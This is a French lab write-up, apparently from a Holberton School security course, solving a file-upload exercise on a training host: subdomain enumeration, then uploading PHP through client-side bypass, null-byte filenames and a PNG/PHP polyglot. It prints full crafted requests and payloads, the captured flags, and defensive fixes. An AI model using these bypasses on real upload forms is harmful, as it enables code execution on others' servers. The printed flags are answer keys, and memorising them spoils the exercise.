# Documentation - Upload Vulnerabilities (0x05)

## Informations générales

**Subdomain cible** : `test-s3.web0x05.hbtn`
**Machine cible** : Cyber - WebSec 0x05

---

## Task 0 : Identifier le sous-domaine vulnérable

### Objectif
Identifier le sous-domaine vulnérable de l'application web.

### Méthodologie

1. **Énumération de Virtual Hosts avec Gobuster**

   Utiliser `gobuster` en mode `vhost` pour énumérer les sous-domaines :

   ```bash
   gobuster vhost -u http://web0x05.hbtn \
                  -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt \
                  -t 800 \
                  --append-domain
   ```

   **Explication des paramètres** :
   - `vhost` : Mode d'énumération de virtual hosts
   - `-u` : URL de base du domaine cible
   - `-w` : Wordlist de sous-domaines (n0kovo_subdomains est complète et efficace)
   - `-t 800` : Nombre de threads (800 pour une énumération rapide)
   - `--append-domain` : Ajoute automatiquement le domaine de base aux mots de la wordlist

2. **Analyse des résultats**

   Gobuster affichera les sous-domaines trouvés avec leur code de statut HTTP :
   ```
   Found: test-s3.web0x05.hbtn (Status: 200)
   ```

3. **Vérification manuelle**

   Une fois le sous-domaine identifié, le tester dans un navigateur :
   ```bash
   curl -I http://test-s3.web0x05.hbtn
   ```

### Résultat

**Sous-domaine vulnérable trouvé** : `test-s3.web0x05.hbtn`

**Fichier de sortie** : [0-target.txt](0-target.txt)

```
test-s3.web0x05.hbtn
```

---

## Task 1 : Bypass du filtrage client-side

### Objectif
Bypasser le filtrage de type de fichier côté client pour uploader un fichier PHP et récupérer le flag.

### Vulnérabilité
L'application utilise uniquement une validation JavaScript côté client pour vérifier le type de fichier uploadé. Cette validation peut être contournée en interceptant et modifiant la requête HTTP avant qu'elle n'atteigne le serveur.

### Prérequis
- Burp Suite configuré et fonctionnel
- Navigateur configuré pour utiliser Burp comme proxy (127.0.0.1:8080)
- Une image PNG quelconque

### Méthodologie détaillée

#### Étape 1 : Préparation du fichier

Avoir une image PNG à disposition (n'importe laquelle) :
```bash
# Option 1 : Utiliser une image existante
cp /path/to/any/image.png payload.png

# Option 2 : Créer une image simple
convert -size 100x100 xc:white payload.png

# Option 3 : Télécharger une image
wget https://via.placeholder.com/150.png -O payload.png
```

#### Étape 2 : Configuration de Burp Suite

1. Lancer Burp Suite :
   ```bash
   burpsuite
   ```

2. Configurer Firefox pour utiliser le proxy Burp :
   - Ouvrir Firefox
   - Aller dans **Paramètres → Réseau → Paramètres de connexion**
   - Sélectionner **Configuration manuelle du proxy**
   - HTTP Proxy : `127.0.0.1`
   - Port : `8080`
   - Cocher **Utiliser ce serveur proxy pour tous les protocoles**

3. Dans Burp Suite :
   - Aller dans **Proxy → Intercept**
   - S'assurer que **"Intercept is off"** pour le moment

#### Étape 3 : Accès au endpoint vulnérable

1. Naviguer vers : `http://test-s3.web0x05.hbtn/task1`
2. Observer le formulaire d'upload

#### Étape 4 : Activation de l'interception

1. Dans Burp Suite, activer l'interception : **"Intercept is on"**
2. Dans Firefox, sélectionner le fichier `payload.png`
3. Cliquer sur le bouton **Upload**

#### Étape 5 : Interception et modification de la requête

La requête interceptée ressemble à ceci :

```http
POST /api/task1/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task1
Content-Type: multipart/form-data; boundary=---------------------------372773235834417249173309245902
Content-Length: 4770
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------372773235834417249173309245902
Content-Disposition: form-data; name="file"; filename="payload.png"
Content-Type: image/png

[Contenu binaire de l'image PNG...]
-----------------------------372773235834417249173309245902--
```

**Modifications à effectuer** :

1. **Changer le filename** :
   ```
   filename="payload.png"  →  filename="payload.php"
   ```

2. **Remplacer le contenu binaire** par le payload PHP :
   ```php
   <?php readfile('FLAG_1.txt') ?>
   ```

3. **Garder** `Content-Type: image/png` (ne pas modifier)

**Requête modifiée** :

```http
POST /api/task1/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task1
Content-Type: multipart/form-data; boundary=---------------------------372773235834417249173309245902
Content-Length: 240
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------372773235834417249173309245902
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: image/png

<?php readfile('FLAG_1.txt') ?>
-----------------------------372773235834417249173309245902--
```

#### Étape 6 : Envoi de la requête modifiée

1. Cliquer sur **Forward** dans Burp Suite
2. Désactiver l'interception : **"Intercept is off"**

#### Étape 7 : Vérification de l'upload

1. Retourner sur la page `http://test-s3.web0x05.hbtn/task1`
2. Observer que `payload.php` a été uploadé avec succès
3. Copier le lien du fichier uploadé (bouton "copy link")

#### Étape 8 : Exécution du payload et récupération du flag

**Méthode 1 : Via navigateur**
```
http://test-s3.web0x05.hbtn/static/upload/payload.php
```

**Méthode 2 : Via curl**
```bash
curl http://test-s3.web0x05.hbtn/static/upload/payload.php
```

### Résultat

**FLAG récupéré** : `1d38ded926706bc96695b2ec52263bfd`

**Fichier de sortie** : [1-flag.txt](1-flag.txt)

```
1d38ded926706bc96695b2ec52263bfd
```

---

## Task 2 : Bypass de la validation serveur avec caractères spéciaux

### Objectif
Bypasser la validation côté serveur qui vérifie les extensions de fichiers en utilisant des caractères spéciaux dans le nom du fichier pour tromper la logique de validation.

### Vulnérabilité
Après avoir contourné la validation client-side (Task 1), le serveur implémente maintenant une validation des extensions côté serveur. Cependant, cette validation peut être contournée en exploitant la manière dont le serveur traite les caractères spéciaux dans les noms de fichiers.

### Prérequis
- Burp Suite configuré et fonctionnel
- Navigateur configuré pour utiliser Burp comme proxy (127.0.0.1:8080)
- Compréhension des caractères spéciaux et du null byte

### Concept : Caractères spéciaux et Null Byte

**Caractères spéciaux** peuvent inclure :
- **Null byte** : `%00` ou `\x00` - Termine une chaîne en C/PHP
- **Espaces** : Peuvent être ignorés ou supprimés
- **Points multiples** : `file.php.jpg` - Double extension
- **Caractères de contrôle** : `\r`, `\n`, etc.

**Null Byte Injection** :
Le null byte (`%00`) termine prématurément les chaînes de caractères dans certains langages (C, PHP < 5.3.4), permettant de tromper la validation d'extension.

### Méthodologie détaillée

#### Étape 1 : Créer le fichier PHP payload

Crée un fichier `payload.php` avec le contenu suivant :

```bash
echo '<?php readfile("FLAG_2.txt") ?>' > payload.php
```

#### Étape 2 : Renommer avec une extension autorisée

Renomme le fichier avec une extension qui sera acceptée par la validation client-side :

```bash
mv payload.php payload.php.jpg
```

Ou crée directement :
```bash
echo '<?php readfile("FLAG_2.txt") ?>' > payload.php.jpg
```

#### Étape 3 : Configuration de Burp Suite

1. Lance Burp Suite :
   ```bash
   burpsuite
   ```

2. Configure Firefox pour utiliser le proxy Burp (127.0.0.1:8080)

3. Dans Burp Suite :
   - Va dans **Proxy → Intercept**
   - Active l'interception : **"Intercept is on"**

#### Étape 4 : Upload et interception

1. Navigue vers : `http://test-s3.web0x05.hbtn/task2`
2. Sélectionne le fichier `payload.php.jpg`
3. Clique sur **Upload**
4. Burp intercepte la requête

#### Étape 5 : Null Byte Injection dans Burp

La requête interceptée ressemble à ceci :

```http
POST /api/task2/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task2
Content-Type: multipart/form-data; boundary=---------------------------xxxxx
Content-Length: xxx
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------xxxxx
Content-Disposition: form-data; name="file"; filename="payload.php.jpg"
Content-Type: image/jpeg

<?php readfile('FLAG_2.txt') ?>
-----------------------------xxxxx--
```

**Modifications à effectuer** :

**Option A : Null Byte avant l'extension** (Technique principale)
```
filename="payload.php.jpg"  →  filename="payload.php%00.jpg"
```

**Option B : Null Byte dans l'extension**
```
filename="payload.php.jpg"  →  filename="payload.php\x00.jpg"
```

**Option C : Double extension simple** (si le serveur prend la première extension)
```
filename="payload.php.jpg"  →  filename="payload.php.jpg"
```
(Garde tel quel si le serveur mal configuré prend la première extension)

**Requête modifiée finale** (avec null byte) :

```http
POST /api/task2/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task2
Content-Type: multipart/form-data; boundary=---------------------------xxxxx
Content-Length: xxx
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------xxxxx
Content-Disposition: form-data; name="file"; filename="payload.php%00.jpg"
Content-Type: image/jpeg

<?php readfile('FLAG_2.txt') ?>
-----------------------------xxxxx--
```

#### Étape 6 : Envoi de la requête modifiée

1. Clique sur **Forward** dans Burp Suite
2. Désactive l'interception : **"Intercept is off"**

#### Étape 7 : Vérification de l'upload

Après l'upload, vérifie sur la page `/task2` :
- Le fichier devrait apparaître comme uploadé
- Note le nom du fichier sauvegardé (probablement `payload.php`)

#### Étape 8 : Accéder au fichier et récupérer le flag

**Méthode 1 : Via curl**
```bash
curl http://test-s3.web0x05.hbtn/static/upload/payload.php
```

**Méthode 2 : Via navigateur**
```
http://test-s3.web0x05.hbtn/static/upload/payload.php
```

**Si le chemin exact n'est pas connu, essayer** :
```bash
curl http://test-s3.web0x05.hbtn/uploads/payload.php
curl http://test-s3.web0x05.hbtn/upload/payload.php
```

### Résultat

**FLAG récupéré** : `7e65f8b52e7958b351f66fe9ad4ae26d`

**Fichier de sortie** : [2-flag.txt](2-flag.txt)

```
7e65f8b52e7958b351f66fe9ad4ae26d
```

### Explication technique de la vulnérabilité

#### 1. Validation serveur faible

Le serveur implémente une validation d'extension côté serveur :

```php
// Validation côté serveur (vulnérable)
$filename = $_FILES['file']['name'];
$extension = pathinfo($filename, PATHINFO_EXTENSION);

$allowed = ['jpg', 'jpeg', 'png', 'gif'];
if (!in_array(strtolower($extension), $allowed)) {
    die('Extension non autorisée');
}

// Sauvegarde du fichier
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
```

**Problème** : La fonction `pathinfo()` s'arrête au premier null byte.

#### 2. Null Byte Injection

Le null byte (`%00` ou `\x00`) exploite le fait que :

```php
// Le serveur reçoit : "payload.php%00.jpg"
$extension = pathinfo("payload.php\x00.jpg", PATHINFO_EXTENSION);
// pathinfo() voit : "payload.php" (s'arrête au null byte)
// Résultat : $extension = "php" MAIS validation voit ".jpg"

// OU selon l'implémentation :
// pathinfo() voit tout : "payload.php%00.jpg"
// Résultat : $extension = "jpg" → ✅ Validation passée
// Mais sauvegarde : le système de fichiers tronque au null byte
// Fichier sauvegardé : "payload.php"
```

#### 3. Comportement selon les versions PHP

| Version PHP | Comportement avec null byte | Exploitation |
|-------------|----------------------------|--------------|
| **PHP < 5.3.4** | Tronque la chaîne au `\x00` | ✅ Vulnérable |
| **PHP 5.3.4 - 5.4** | Partiellement protégé | ⚠️ Parfois vulnérable |
| **PHP > 5.4** | Protégé (mais dépend du code) | ❌ Généralement non vulnérable |

**Note** : Même avec des versions récentes, du code mal écrit peut rester vulnérable.

#### 4. Autres techniques de bypass

**Double extension** :
```
payload.php.jpg → Le serveur peut prendre la première extension (.php)
```

**Casse mixte** :
```
payload.PhP → Si validation sensible à la casse
```

**Espaces et points** :
```
payload.php. → Point terminal ignoré par Windows
payload.php<espace> → Espace terminal ignoré
```

### Variantes de la technique

#### Variante 1 : Double extension sans null byte

Si le serveur est mal configuré et exécute les fichiers avec la **première** extension :

```
payload.php.jpg → Exécuté comme PHP si mal configuré
```

#### Variante 2 : Caractères de fin ignorés (Windows)

Sur serveurs Windows :

```bash
payload.php. → Point final ignoré → payload.php
payload.php<espace> → Espace ignoré → payload.php
```

#### Variante 3 : Casse mixte

Si la validation est sensible à la casse :

```
payload.PhP → Bypass si validation cherche uniquement ".php"
payload.pHp
payload.Php
```

---

## Task 3 : Bypass de la validation des Magic Numbers

### Objectif
Bypasser la validation côté serveur qui inspecte les magic numbers (premiers octets) des fichiers uploadés pour identifier leur type réel.

### Vulnérabilité
L'application vérifie maintenant le contenu réel du fichier en lisant les magic numbers, mais peut être trompée par un fichier hybride qui combine :
- Les magic numbers d'une image PNG (pour passer la validation)
- Du code PHP exécutable (pour lire le flag)
- Une technique de null byte injection pour bypasser le filtre d'extension

### Prérequis
- Burp Suite configuré et fonctionnel
- Navigateur configuré pour utiliser Burp comme proxy (127.0.0.1:8080)
- `hexeditor` installé sur Kali

### Concept : Magic Numbers

**Magic Numbers** : Ce sont les premiers octets d'un fichier qui identifient son type de manière unique.

**Exemples de Magic Numbers** :
| Type de fichier | Magic Numbers (hex) | Magic Numbers (ASCII) |
|-----------------|---------------------|----------------------|
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` |
| JPEG | `FF D8 FF E0` | `ÿØÿà` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |

### Méthodologie détaillée

#### Étape 1 : Créer le fichier de base avec placeholder

```bash
cat > image3.php.png << 'EOF'
12345678
<?php readfile('FLAG_3.txt') ?>
EOF
```

**Explication** :
- `12345678` : 8 caractères placeholder (seront remplacés par les magic numbers PNG)
- Pourquoi 8 ? Les magic numbers PNG font exactement 8 octets
- Le code PHP vient après les magic numbers

#### Étape 2 : Modifier les magic numbers avec hexeditor

```bash
hexeditor image3.php.png
```

**Dans hexeditor, tu verras** :
```
00000000  31 32 33 34  35 36 37 38   0A 3C 3F 70  68 70 20 72    12345678.<?php r
00000010  65 61 64 66  69 6C 65 28   27 46 4C 41  47 5F 33 2E    eadfile('FLAG_3.
00000020  74 78 74 27  29 20 3F 3E   0A                         txt') ?>.
```

**Remplacer les 8 premiers octets** :

| Position | Valeur actuelle | Nouvelle valeur |
|----------|-----------------|-----------------|
| Octet 1 | `31` (1) | `89` |
| Octet 2 | `32` (2) | `50` |
| Octet 3 | `33` (3) | `4E` |
| Octet 4 | `34` (4) | `47` |
| Octet 5 | `35` (5) | `0D` |
| Octet 6 | `36` (6) | `0A` |
| Octet 7 | `37` (7) | `1A` |
| Octet 8 | `38` (8) | `0A` |

**Procédure dans hexeditor** :
1. Place le curseur sur le premier octet (`31`)
2. Tape les valeurs hexadécimales une par une : `89` `50` `4E` `47` `0D` `0A` `1A` `0A`
3. Le curseur avance automatiquement après chaque paire de chiffres
4. Sauvegarde : `Ctrl+X` puis confirme avec `Y` ou `O`

**Résultat après modification** :
```
00000000  89 50 4E 47  0D 0A 1A 0A   0A 3C 3F 70  68 70 20 72    .PNG.....<?php r
00000010  65 61 64 66  69 6C 65 28   27 46 4C 41  47 5F 33 2E    eadfile('FLAG_3.
00000020  74 78 74 27  29 20 3F 3E   0A                         txt') ?>.
```

#### Étape 3 : Vérifier le fichier modifié

**Vérifier avec hexdump** :
```bash
hexdump -C image3.php.png | head -n 3
```

**Output attendu** :
```
00000000  89 50 4e 47 0d 0a 1a 0a  0a 3c 3f 70 68 70 20 72  |.PNG.....<?php r|
00000010  65 61 64 66 69 6c 65 28  27 46 4c 41 47 5f 33 2e  |eadfile('FLAG_3.|
00000020  74 78 74 27 29 20 3f 3e  0a                       |txt') ?>.|
```

**Vérifier avec file** :
```bash
file image3.php.png
```

**Output attendu** :
```
image3.php.png: PNG image data
```

✅ Le système détecte maintenant le fichier comme une image PNG grâce aux magic numbers!

#### Étape 4 : Configuration de Burp Suite

1. Lancer Burp Suite :
   ```bash
   burpsuite
   ```

2. Configurer Firefox pour utiliser le proxy Burp :
   - HTTP Proxy : `127.0.0.1`
   - Port : `8080`

3. Dans Burp Suite :
   - Aller dans **Proxy → Intercept**
   - Activer l'interception : **"Intercept is on"**

#### Étape 5 : Upload et interception

1. Naviguer vers : `http://test-s3.web0x05.hbtn/task3`
2. Sélectionner le fichier `image3.php.png`
3. Cliquer sur **Upload**
4. Burp intercepte la requête

#### Étape 6 : Null Byte Injection dans Burp

La requête interceptée ressemble à ceci :

```http
POST /api/task3/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task3
Content-Type: multipart/form-data; boundary=---------------------------68636402925356422642491128704
Content-Length: 264
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------68636402925356422642491128704
Content-Disposition: form-data; name="file"; filename="image3.php.png"
Content-Type: application/octet-stream

[Contenu binaire avec magic numbers PNG + code PHP]
-----------------------------68636402925356422642491128704--
```

**Modifications à effectuer (CRUCIAL)** :

1. **Ajouter le null byte dans le filename** :
   ```
   filename="image3.php.png"  →  filename="image3.php%00.png"
   ```

2. **Changer le Content-Type** :
   ```
   Content-Type: application/octet-stream  →  Content-Type: image/png
   ```

**Requête modifiée finale** :

```http
POST /api/task3/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task3
Content-Type: multipart/form-data; boundary=---------------------------68636402925356422642491128704
Content-Length: 264
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------68636402925356422642491128704
Content-Disposition: form-data; name="file"; filename="image3.php%00.png"
Content-Type: image/png

�PNG

<?php readfile('FLAG_3.txt') ?>

-----------------------------68636402925356422642491128704--
```

#### Étape 7 : Envoi de la requête modifiée

1. Cliquer sur **Forward** dans Burp Suite
2. Désactiver l'interception : **"Intercept is off"**

#### Étape 8 : Exécution du payload et récupération du flag

**Méthode 1 : Via curl**
```bash
curl http://test-s3.web0x05.hbtn/static/upload/image3.php
```

**Méthode 2 : Via navigateur**
```
http://test-s3.web0x05.hbtn/static/upload/image3.php
```

### Résultat

**FLAG récupéré** : `8b73b0afdd57fbd2d44dc384babd03a7`

**Fichier de sortie** : [3-flag.txt](3-flag.txt)

```
8b73b0afdd57fbd2d44dc384babd03a7
```

### Explication technique de la vulnérabilité

#### 1. Bypass des Magic Numbers

Le serveur vérifie les magic numbers pour identifier le type réel du fichier :

```php
// Validation côté serveur
$handle = fopen($_FILES['file']['tmp_name'], 'rb');
$header = fread($handle, 8);
fclose($handle);

$png_header = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a";
if ($header === $png_header) {
    // ✅ Fichier accepté comme PNG valide
}
```

En ajoutant les magic numbers PNG au début du fichier, celui-ci passe la validation de contenu.

#### 2. Null Byte Injection

Le null byte (`%00` ou `\x00`) tronque les chaînes de caractères dans certains langages :

```php
// Le serveur reçoit : "image3.php%00.png"
// En PHP/C, le %00 termine la chaîne
// Résultat : le fichier est traité comme "image3.php"
```

**Processus** :
1. Le serveur vérifie l'extension : `.png` → ✅ Accepté
2. Le serveur vérifie les magic numbers : `89 50 4E 47...` → ✅ C'est un PNG
3. Le serveur sauvegarde le fichier : le `%00` tronque → sauvegarde comme `image3.php`
4. Le fichier est exécutable comme PHP avec extension `.php`

#### 3. Fichier hybride PNG/PHP

Le fichier créé est un **polyglotte** :
- Il est valide en tant qu'image PNG (magic numbers corrects)
- Il contient du code PHP exécutable
- Le serveur web l'exécute comme PHP grâce à l'extension `.php`

**Structure du fichier** :
```
┌─────────────────────────────────────────────┐
│  Fichier: image3.php (après upload)         │
├─────────────────────────────────────────────┤
│  89 50 4E 47 0D 0A 1A 0A  ← Magic PNG      │
│  (8 octets)                                 │
├─────────────────────────────────────────────┤
│  0A                        ← Newline        │
├─────────────────────────────────────────────┤
│  <?php readfile('FLAG_3.txt') ?>            │
│  ↑                                          │
│  Code PHP exécuté par le serveur            │
└─────────────────────────────────────────────┘
```

### Méthode alternative : Commande unique

Pour créer le fichier directement avec les magic numbers :

```bash
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\n<?php readfile("FLAG_3.txt") ?>' > image3.php.png
```

---

## Résumé des vulnérabilités par tâche

### Task 1 : Validation client-side uniquement
- L'application vérifie le type de fichier uniquement via JavaScript dans le navigateur
- Pas de validation serveur : Le serveur accepte n'importe quel fichier sans vérification côté backend
- Exécution PHP activée : Le serveur exécute les fichiers `.php` dans le répertoire d'upload

### Task 2 : Validation serveur avec caractères spéciaux
- Le serveur vérifie les extensions de fichiers côté serveur
- Vulnérable à la null byte injection (`%00`) pour tronquer le nom de fichier
- La fonction `pathinfo()` ou le système de fichiers peut être exploité
- Double extension mal gérée par le serveur

### Task 3 : Validation des magic numbers insuffisante
- Le serveur vérifie les magic numbers mais accepte les fichiers hybrides/polyglottes
- Vulnérable à la null byte injection pour bypasser les filtres d'extension
- Pas de vérification de l'intégrité complète du fichier (seulement les 8 premiers octets)

### Comment se protéger ?

1. **Validation côté serveur obligatoire** :
   ```php
   // Vérifier l'extension
   $allowed = ['jpg', 'jpeg', 'png', 'gif'];
   $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
   if (!in_array(strtolower($ext), $allowed)) {
       die('Type de fichier non autorisé');
   }

   // Vérifier le MIME type réel
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
   if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
       die('Type MIME invalide');
   }
   ```

2. **Renommer les fichiers uploadés** :
   ```php
   $new_name = md5(uniqid()) . '.png';
   ```

3. **Stocker les uploads hors du webroot** ou désactiver l'exécution PHP :
   ```apache
   # .htaccess dans le dossier upload
   php_flag engine off
   ```

4. **Vérifier le contenu réel du fichier** (magic bytes) :
   ```php
   // Vérifier les magic bytes d'une image PNG
   $handle = fopen($_FILES['file']['tmp_name'], 'rb');
   $header = fread($handle, 8);
   fclose($handle);

   $png_header = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a";
   if ($header !== $png_header) {
       die('Pas une vraie image PNG');
   }
   ```

5. **Liste blanche stricte** plutôt que liste noire

---

## Outils utilisés

- **Gobuster** : Énumération de virtual hosts et sous-domaines
- **Burp Suite** : Proxy d'interception HTTP pour modifier les requêtes
- **hexeditor** : Éditeur hexadécimal pour modifier les magic numbers
- **Firefox** : Navigateur avec configuration proxy
- **curl** : Client HTTP en ligne de commande
- **hexdump** : Visualisation du contenu hexadécimal des fichiers
- **file** : Identification du type de fichier basé sur les magic numbers

---

## Récapitulatif des flags

| Task | Technique | FLAG |
|------|-----------|------|
| Task 0 | Énumération de sous-domaines | `test-s3.web0x05.hbtn` |
| Task 1 | Bypass validation client-side | `1d38ded926706bc96695b2ec52263bfd` |
| Task 2 | Null byte injection (caractères spéciaux) | `7e65f8b52e7958b351f66fe9ad4ae26d` |
| Task 3 | Bypass magic numbers + null byte | `8b73b0afdd57fbd2d44dc384babd03a7` |

---

## Références

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [Null Byte Injection](https://owasp.org/www-community/attacks/Null_Byte_Injection)
- [File Signature Database](https://www.garykessler.net/library/file_sigs.html)

---

**Date** : 2025-10-13
**Auteur** : Patri
**Projet** : Holberton School - Cyber Security - Web Application Security
